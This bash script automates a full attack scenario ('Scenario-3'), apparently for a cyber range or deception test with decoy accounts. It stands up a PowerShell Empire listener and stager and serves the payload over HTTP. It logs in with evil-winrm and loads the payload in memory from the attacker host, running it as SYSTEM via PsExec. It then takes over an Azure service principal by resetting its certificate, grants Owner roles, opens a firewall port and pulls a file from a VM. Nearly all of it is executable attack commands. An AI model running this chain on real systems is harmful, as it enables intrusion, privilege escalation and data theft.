#!/bin/bash

SESSION_NAME="Scenario-3"
LOG_BASE="/home/<local_administrator>/logs"

mkdir /home/<local_administrator>/payloads
mkdir $LOG_BASE

LOG_FILE0="$LOG_BASE/$SESSION_NAME-0.log"
LOG_FILE1="$LOG_BASE/$SESSION_NAME-1.log"
LOG_FILE2="$LOG_BASE/$SESSION_NAME-2.log"
LOG_FILE3="$LOG_BASE/$SESSION_NAME-3.log"
LOG_FILE4="$LOG_BASE/$SESSION_NAME-4.log"

tmux kill-session -t $SESSION_NAME
sleep 3
tmux new-session -d -s $SESSION_NAME

echo "" >  $LOG_FILE0
echo "" >  $LOG_FILE1
echo "" >  $LOG_FILE2
echo "" >  $LOG_FILE3
echo "" >  $LOG_FILE4

tmux pipe-pane -t $SESSION_NAME:0 'cat >> '"$LOG_FILE0"
tmux send-keys -t $SESSION_NAME:0 "sudo powershell-empire server"
sleep 2
tmux send-keys -t $SESSION_NAME:0 C-m
/home/<local_administrator>/wait_for_prompt.exp "http://0.0.0.0:1337" $SESSION_NAME:0

sleep 7

tmux new-window -t $SESSION_NAME -n "Empire Client"
tmux pipe-pane -t $SESSION_NAME:1 'cat >> '"$LOG_FILE1"

tmux send-keys -t $SESSION_NAME:1 "sudo powershell-empire client"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "uselistener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Host http://<server_domain>:80"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Port 80"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: uselistener/http) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "usestager windows_csharp_exe"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set Listener http"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "set OutFile /home/<local_administrator>/payloads/Scenario3.exe"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "execute"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usestager/windows_csharp_exe) >" $SESSION_NAME:1

sleep 7
cp /var/lib/powershell-empire/empire/client/generated-stagers/Scenario3.exe /home/<local_administrator>/payloads/Scenario3.exe



tmux new-window -t $SESSION_NAME -n "Hosting Payload Web Server"
tmux pipe-pane -t $SESSION_NAME:2 'cat >> '"$LOG_FILE2"
tmux send-keys -t $SESSION_NAME:2 "cd /home/<local_administrator>/payloads"
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux send-keys -t $SESSION_NAME:2 "python3 -m http.server 8081"
sleep 2
tmux send-keys -t $SESSION_NAME:2 C-m

sleep 3

tmux new-window -t $SESSION_NAME -n "Evil-Winrm"
tmux pipe-pane -t $SESSION_NAME:3 'cat >> '"$LOG_FILE3"

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i <workstation_ip> -u '<scenario3Username>' -p '<scenario3Password>'"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://<server_ip>:8081/Scenario3.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\<scenario3Username>\Documents\PSTools.zip"'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\<scenario3Username>\Documents\PSTools.zip" -DestinationPath "C:\Users\<scenario3Username>\Documents"'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\<scenario3Username>\Documents\run.ps1" -accepteula'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "agents"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "checked in" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact "
sleep 2
tmux send-keys -t $SESSION_NAME:1 Down
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "shell"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "whoami"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "Get-ScheduledTask | Where-Object {\$_.State -eq 'Ready'} | Select-Object TaskName, State"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "system32" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "(Get-ScheduledTask -TaskName "<scenario3ScheduledTask>").Actions | Select-Object Execute, Arguments | Format-List"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "system32" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'exit'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'usemodule powershell_situational_awareness_network_powerview_get_user'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_situational_awareness_network_powerview_get_user) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'set Properties samaccountname,description'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: usemodule/powershell_situational_awareness_network_powerview_get_user) >" $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 'execute'
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux select-window -t $SESSION_NAME:3

tmux send-keys -t $SESSION_NAME:3 C-c

sleep 7

tmux send-keys -t $SESSION_NAME:3 "y" C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i <workstation_ip> -u '<scenario3DecoyUsername>' -p '<scenario3DecoyPassword>'"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Error: Exiting with code 1" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "evil-winrm -i <workstation_ip> -u '<administrator_user>' -p '<administrator_password>'"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "whoami"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 "hostname"
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Set-Content -Path .\run.ps1 -Value "[System.Reflection.Assembly]::Load((Invoke-WebRequest -Uri http://<server_ip>:8081/Scenario3.exe -UseBasicParsing).Content).EntryPoint.Invoke([DBNull]::Value, @())" -Encoding UTF8'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\Users\<administrator_user>\Documents\PSTools.zip"'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 'Expand-Archive -Path "C:\Users\<administrator_user>\Documents\PSTools.zip" -DestinationPath "C:\Users\<administrator_user>\Documents"'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux send-keys -t $SESSION_NAME:3 '.\PsExec.exe -s powershell.exe -ExecutionPolicy Bypass -File "C:\Users\<administrator_user>\Documents\run.ps1" -accepteula'
sleep 2
tmux send-keys -t $SESSION_NAME:3 C-m
/home/<local_administrator>/wait_for_prompt.exp "Evil-WinRM" $SESSION_NAME:3

sleep 7

tmux select-window -t $SESSION_NAME:1

sleep 7

tmux send-keys -t $SESSION_NAME:1 "agents"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: agents) >" $SESSION_NAME:1

sleep 7

agent=$(cat $LOG_FILE1 | grep "checked in" | tail -1 | awk '{print $15}')
echo $agent

sleep 7

tmux send-keys -t $SESSION_NAME:1 "interact $agent"
sleep 2
tmux send-keys -t $SESSION_NAME:1 C-m
/home/<local_administrator>/wait_for_prompt.exp "(Empire: " $SESSION_NAME:1

sleep 7

tmux new-window -t $SESSION_NAME -n "Azure"
tmux pipe-pane -t $SESSION_NAME:4 'cat >> '"$LOG_FILE4"
tmux send-keys -t $SESSION_NAME:4 'cd /home/<local_administrator>; mkdir Scenario-3; cd Scenario-3'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u <scenario3Username>@<entraIDDomain> -p <scenario3Password> --allow-no-subscriptions'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'SERVICE_PRINCIPAL_ID=$(az ad sp list --display-name "<service_principal_name>" --query "[0].appId" --output tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'jeffUserId=$(az ad user show --id "<scenario3Username>@<entraIDDomain>" --query 'id' --output tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'CERT_PATH=$(az ad app credential reset --id $SERVICE_PRINCIPAL_ID --create-cert --query "fileWithCertAndPrivateKey" -o tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'TENANT_ID=$(az account show --query tenantId --output tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 30

tmux send-keys -t $SESSION_NAME:4 'az login --service-principal --username $SERVICE_PRINCIPAL_ID --certificate $CERT_PATH --tenant $TENANT_ID'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'SUBSCRIPTION_ID=$(az account show --query id --output tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/<hrDepartmentRGName>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/<webappRGName>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/<entraIDRGName>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role Owner  --scope /subscriptions/$SUBSCRIPTION_ID/resourceGroups/<itKeyvaultRGName>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az login -u <scenario3Username>@<entraIDDomain> -p <scenario3Password>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7


tmux send-keys -t $SESSION_NAME:4 'az resource list --resource-group <webappRGName> --output table'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'vmResourceId=$(az resource show --resource-group "<webappRGName>" --name "<scenario3VMName>" --resource-type "Microsoft.Compute/virtualMachines" --query "id" --output tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az role assignment create --assignee $jeffUserId --role "Contributor" --scope $vmResourceId'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'publicIPAddress=$(az vm list-ip-addresses -g <webappRGName> -n <scenario3VMName> --query "[].virtualMachine.network.publicIpAddresses[0].ipAddress" -o tsv)'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az network nsg rule create --resource-group "<webappRGName>" --nsg-name <scenario3NSGName> --name "allow-8080" --priority 4001 --access Allow --direction Inbound --protocol Tcp --source-address-prefix "*" --source-port-range "*" --destination-address-prefix "*" --destination-port-range 8080'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group "<webappRGName>" --name <scenario3VMName> --command-id RunShellScript --scripts 'ls -la /home/<local_administrator>'" # && tmux wait-for -S command_run"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4


sleep 7

tmux send-keys -t $SESSION_NAME:4 "az vm run-command invoke --resource-group <webappRGName> --name <scenario3VMName> --command-id RunShellScript --scripts 'python3 -m http.server 8080 --directory /home/<local_administrator> &'" # && tmux wait-for -S command_run"
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
# tmux wait-for command_run
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 20

tmux send-keys -t $SESSION_NAME:4 'wget http://$publicIPAddress:8080/<scenario3DecoyFile> -O /home/<local_administrator>/Scenario-3/<scenario3DecoyFile>'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

tmux send-keys -t $SESSION_NAME:4 'az network nsg rule delete --resource-group "<webappRGName>" --nsg-name <scenario3NSGName> --name "allow-8080"'
sleep 2
tmux send-keys -t $SESSION_NAME:4 C-m
/home/<local_administrator>/wait_for_prompt.exp "(<local_administrator>" $SESSION_NAME:4

sleep 7

echo "Reached the end."
